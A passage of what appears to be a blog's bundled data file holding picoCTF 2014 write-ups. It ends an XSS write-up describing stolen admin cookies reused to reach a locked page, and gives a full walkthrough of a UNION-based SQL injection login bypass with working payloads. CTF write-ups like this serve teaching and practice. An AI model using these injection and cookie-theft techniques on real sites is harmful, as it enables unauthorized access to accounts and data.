clients.\\n\\nCookie Forgery\\n----------------------\\nAfter setting up a page with the injected script and the php script on another server, we simply report the page to have a mod (in reality a bot) view the page.\\n\\nFrom here, we check our email for the admin cookies. Using a plugin like <a href=\'https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en\'>this</a> or <a href=\'https://addons.mozilla.org/en-us/firefox/addon/edit-cookies/\'>this</a> we can quickly change our cookies to the admin\'s, allowing us to view the locked page, and thus, the flag:\\n\\nwow\\\\_cross\\\\_site\\\\_scripting\\\\_is\\\\_such\\\\_web"},{"id":"picoctf-2014-part1","metadata":{"permalink":"/blog/picoctf-2014-part1","source":"@site/blog/2014-11-29-picoctf-part1.md","title":"picoCTF 2014 part 1: Injection 2","description":"Summary","date":"2014-11-29T00:00:00.000Z","tags":[],"readingTime":2.1,"hasTruncateMarker":true,"authors":[{"name":"Clifford","url":"https://github.com/CSRessel","imageURL":"/img/csressel-xs.webp","key":"csressel","page":null}],"frontMatter":{"slug":"picoctf-2014-part1","title":"picoCTF 2014 part 1: Injection 2","authors":"csressel"},"unlisted":false,"prevItem":{"title":"picoCTF 2014 part 2: secure_page_service","permalink":"/blog/picoctf-2014-part2"}},"content":"Summary\\n--------------\\nBy unioning hard coded values with the prewritten select statement, we can manually control exactly what data the query returns, and thus meet the program\u2019s requirements.\\n```SQL\\nSELECT * FROM users WHERE username=\'asdf\' UNION SELECT 1337 AS a, 1337 AS b, 1337 AS c, 1337 AS d, 1337 AS e LIMIT 1 -- \'\\n```\\n(with \u201c1337\u201d entered as the password)\\n\\n\x3c!--truncate--\x3e\\n\\nThe Program\\n-------------------\\nThe source is available <a href=\'http://web2014.picoctf.com/injection2/login.phps\'>here</a>. Examination of the source shows several things.\\nFirst, we can make injections into the username field.\\nSecond, the returned data from the query will need to meet the following requirements to reveal the flag:\\n- `mysqli_num_rows($result) === 1` \u2014 only one row\\n- `$row[\\"password\\"] === $password` \u2014 row\u2019s password must match our given password\\n- `$row[\\"user_level\\"] >= 1337` \u2014 row\u2019s user_level must be greater than or equal to 1337\\n\\nFinally, by setting the form\u2019s hidden field \u201cdebug\u201d to 1, we receive a nice view of our input and the generated query.\\n\\nThe Injection\\n------------------\\nBy taking a union with a hardcoded query, we can manually control exactly what the returned data contains, and thus meet all the prespecified requirements.\\n\\nAn injection of:\\n```\\nasdf\' UNION SELECT 0 AS a LIMIT 1 -- \\n```\\nWill yield the query:\\n```SQL\\nSELECT * FROM users WHERE username=\'asdf\' UNION SELECT 0 AS a LIMIT 1 -- \\n```\\n\\nLet\u2019s break that query down: we set the username to be a value unlikely to appear in the database. We then union that SELECT statement with our own, which includes a hard coded value of 0 for the first column. Finally, we return only one of the row with LIMIT 1, to satisfy the aforementioned check for only one row.\\nThis gives us the following error:\\n```\\nSQL error: The used SELECT statements have a different number of columns\\n```\\n\\nHowever, if we add some dummy columns (common sense suggest five columns: username, password, user_level, data created, date last modified), the error disappears.\\nNew query:\\n```SQL\\nSELECT * FROM users WHERE username=\'asdf\' UNION SELECT 0 AS a, 0 AS b, 0 AS c, 0 AS d, 0 AS e LIMIT 1 -- \\n```\\nAs we do not know which column will be the user_level, we can simply set all columns equal to 1337, and input a password of 1337 into the form.\\n\\nThe final query:\\n```SQL\\nSELECT * FROM users WHERE username=\'asdf\' UNION SELECT 1337 AS a, 1337 AS b, 1337 AS c, 1337 AS d, 1337 AS e LIMIT 1 -- \'\\n```\\n\\nThis proves successful!\\n(as the flag appears to be dynamically generated it is not included here)"}]}}')}}]);